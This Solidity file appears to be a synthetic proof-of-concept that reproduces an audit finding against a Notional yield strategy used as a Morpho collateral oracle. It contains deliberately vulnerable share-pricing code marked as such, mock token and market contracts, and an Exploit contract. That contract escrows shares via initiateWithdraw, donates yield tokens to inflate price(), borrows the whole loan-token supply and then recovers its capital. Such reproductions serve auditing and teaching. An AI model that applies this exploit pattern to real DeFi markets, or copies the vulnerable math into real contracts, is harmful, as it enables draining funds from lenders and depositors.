// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Notional Exponent — Attacker can drain Morpho suppliers by inflating
    collateral price after initiateWithdraw + yield-token donation
    (Sherlock 2025-06-notional-exponent, finding #62483, H-2)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: initiateWithdraw escrows shares (effectiveSupply collapses to
    VIRTUAL_SHARES=1e6) but leaves Morpho collateral intact. Donating yield
    tokens then inflates convertSharesToYieldToken / price() massively, so a
    direct Morpho.borrow drains the entire loan-token supply. Attacker still
    finalizes the withdrawal and recovers original capital.

    Vulnerable math preserved from AbstractYieldStrategy:
      convertSharesToYieldToken / convertToAssets / effectiveSupply / price
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced AbstractYieldStrategy / AbstractSingleSidedLP oracle+shares.
///         Morpho uses price() as the collateral oracle (1e36 scale).
contract YieldStrategy {
    uint256 public constant VIRTUAL_SHARES = 1e6;
    uint256 public constant VIRTUAL_YIELD_TOKENS = 1e6;
    uint256 public constant DEFAULT_DECIMALS = 18;

    MockERC20 public immutable yieldToken;
    MockERC20 public immutable asset; // loan-side reference asset (unused in price path beyond decimals)
    uint8 public immutable assetDecimals;
    uint8 public immutable yieldTokenDecimals;

    mapping(address => uint256) public balanceOf; // strategy shares (also Morpho collateral units)
    uint256 public totalSupply;
    uint256 public s_escrowedShares;
    mapping(address => uint256) public escrowedOf;
    mapping(address => bool) public hasWithdrawRequest;

    constructor(MockERC20 _yield, MockERC20 _asset) {
        yieldToken = _yield;
        asset = _asset;
        assetDecimals = _asset.decimals();
        yieldTokenDecimals = _yield.decimals();
    }

    function effectiveSupply() public view returns (uint256) {
        uint256 s = totalSupply - s_escrowedShares;
        // After a large initiateWithdraw the denominator collapses to VIRTUAL_SHARES,
        // so a tiny yield-token donation massively inflates price().
        // FIX: burn Morpho collateral (or reprice withdrawal requests) so donated yield
        // cannot revalue escrowed shares still posted as Morpho collateral.
        return s < VIRTUAL_SHARES ? VIRTUAL_SHARES : s; // @> VULN: floor only VIRTUAL_SHARES
    }

    function _yieldTokenBalance() internal view returns (uint256) {
        return yieldToken.balanceOf(address(this));
    }

    function feesAccrued() public pure returns (uint256) {
        return 0;
    }

    function convertSharesToYieldToken(uint256 shares) public view returns (uint256) {
        return (shares * (_yieldTokenBalance() - feesAccrued() + VIRTUAL_YIELD_TOKENS)) / effectiveSupply();
    }

    function convertYieldTokenToAsset() public pure returns (uint256) {
        return 1e18; // DEFAULT_PRECISION
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 yieldTokens = convertSharesToYieldToken(shares);
        return (yieldTokens * convertYieldTokenToAsset() * (10 ** assetDecimals))
            / (10 ** (yieldTokenDecimals + DEFAULT_DECIMALS));
    }

    /// @notice Morpho oracle: value of 1e18 shares in loan-token units, 1e36 scale.
    function price() public view returns (uint256) {
        // price of 1 share unit * 1e36 / 1e18 = convertToAssets(1e18) scaled when decimals match
        // Morpho: collateral * price / 1e36 = max borrow in loan assets
        return convertToAssets(1e18) * 1e18; // → 1e36-ish scale when convertToAssets ~ 1e18
    }

    function deposit(uint256 yieldAmt) external returns (uint256 shares) {
        yieldToken.transferFrom(msg.sender, address(this), yieldAmt);
        if (totalSupply == 0) {
            shares = yieldAmt; // 1:1 first deposit (abstract units)
        } else {
            shares = (yieldAmt * effectiveSupply()) / (_yieldTokenBalance() - yieldAmt + VIRTUAL_YIELD_TOKENS);
            if (shares == 0) shares = yieldAmt;
        }
        balanceOf[msg.sender] += shares;
        totalSupply += shares;
    }

    /// @notice Escrow shares for withdrawal — does NOT burn Morpho collateral.
    function initiateWithdraw(uint256 shares) external {
        require(balanceOf[msg.sender] >= shares, "bal");
        balanceOf[msg.sender] -= shares;
        // shares stay in totalSupply but escrowed (effectiveSupply shrinks)
        s_escrowedShares += shares;
        escrowedOf[msg.sender] += shares;
        hasWithdrawRequest[msg.sender] = true;
        // yield tokens locked for the request (removed from free balance conceptually —
        // for the donation attack we leave yield in the vault so donation still works;
        // escrow only affects effectiveSupply, matching the finding's observed path)
    }

    function finalizeWithdraw() external returns (uint256 yieldOut) {
        uint256 shares = escrowedOf[msg.sender];
        require(shares > 0, "none");
        // pay out proportional yield at finalize (attacker recovers capital)
        yieldOut = (shares * (_yieldTokenBalance() + VIRTUAL_YIELD_TOKENS)) / (totalSupply + VIRTUAL_SHARES);
        if (yieldOut > _yieldTokenBalance()) yieldOut = _yieldTokenBalance();
        escrowedOf[msg.sender] = 0;
        s_escrowedShares -= shares;
        totalSupply -= shares;
        hasWithdrawRequest[msg.sender] = false;
        yieldToken.transfer(msg.sender, yieldOut);
    }
}

/// @notice Minimal Morpho market: suppliers fund loan token; borrowers post
///         YieldStrategy shares as collateral; maxBorrow = coll * price / 1e36.
contract MockMorpho {
    MockERC20 public immutable loanToken;
    YieldStrategy public immutable collOracle; // strategy is the oracle

    uint256 public totalSupplyAssets;
    uint256 public totalBorrowAssets;
    mapping(address => uint256) public collateral; // shares posted
    mapping(address => uint256) public borrowAssets;

    constructor(MockERC20 _loan, YieldStrategy _oracle) {
        loanToken = _loan;
        collOracle = _oracle;
    }

    function supply(uint256 assets) external {
        loanToken.transferFrom(msg.sender, address(this), assets);
        totalSupplyAssets += assets;
    }

    function supplyCollateral(address onBehalf, uint256 shares) external {
        // In production Morpho pulls the coll token; here the strategy share balance
        // is tracked off-token (shares already minted to onBehalf). We just book it.
        collateral[onBehalf] += shares;
    }

    function borrow(uint256 assets, address onBehalf, address receiver) external {
        uint256 maxB = (collateral[onBehalf] * collOracle.price()) / 1e36;
        require(borrowAssets[onBehalf] + assets <= maxB, "LTV");
        require(totalSupplyAssets - totalBorrowAssets >= assets, "liquidity");
        borrowAssets[onBehalf] += assets;
        totalBorrowAssets += assets;
        loanToken.transfer(receiver, assets);
    }
}

contract Exploit {
    MockERC20 public yieldTok; // CREATE 1
    MockERC20 public usdc; // CREATE 2
    YieldStrategy public y; // CREATE 3 — vulnerable
    MockMorpho public morpho; // CREATE 4

    uint256 public constant ATTACKER_YIELD = 1000e18;
    uint256 public constant SUPPLIER_USDC = 500_000e6; // 500k USDC (6 dec)
    uint256 public constant DONATION = 1e18;

    constructor() {
        yieldTok = new MockERC20("Gauge LP", "gLP", 18);
        usdc = new MockERC20("USD Coin", "USDC", 6);
        y = new YieldStrategy(yieldTok, usdc);
        morpho = new MockMorpho(usdc, y);

        // Honest Morpho suppliers
        usdc.mint(address(this), SUPPLIER_USDC);
        usdc.approve(address(morpho), SUPPLIER_USDC);
        morpho.supply(SUPPLIER_USDC);

        // Attacker receives yield tokens to deposit as strategy shares
        yieldTok.mint(address(this), ATTACKER_YIELD + DONATION);
    }

    function run() external {
        // 1) Enter position: deposit yield → shares, post as Morpho collateral
        yieldTok.approve(address(y), ATTACKER_YIELD);
        uint256 shares = y.deposit(ATTACKER_YIELD);
        morpho.supplyCollateral(address(this), shares);

        uint256 priceBefore = y.price();
        uint256 maxBefore = (shares * priceBefore) / 1e36;

        // 2) initiateWithdraw — escrows ALL shares, effectiveSupply → VIRTUAL_SHARES
        y.initiateWithdraw(y.balanceOf(address(this)));
        // Morpho collateral is NOT burned (still `shares`)

        // 3) Donate yield tokens → inflates convertSharesToYieldToken / price()
        yieldTok.transfer(address(y), DONATION);

        uint256 priceAfter = y.price();
        uint256 maxAfter = (morpho.collateral(address(this)) * priceAfter) / 1e36;

        require(priceAfter > priceBefore * 1000, "price did not inflate");
        require(maxAfter > SUPPLIER_USDC, "maxBorrow should cover whole market");

        // 4) Direct Morpho.borrow drains every supplier
        uint256 borrowable = SUPPLIER_USDC; // full liquidity
        morpho.borrow(borrowable, address(this), address(this));

        require(usdc.balanceOf(address(this)) >= SUPPLIER_USDC, "did not drain suppliers");
        require(morpho.totalBorrowAssets() == SUPPLIER_USDC, "market not emptied");

        // 5) Finalize withdrawal — attacker recovers remaining yield (donation was cost of attack)
        y.finalizeWithdraw();

        // HARM: entire Morpho loan-token supply extracted
        require(usdc.balanceOf(address(this)) >= SUPPLIER_USDC, "harm: suppliers drained");
    }
}
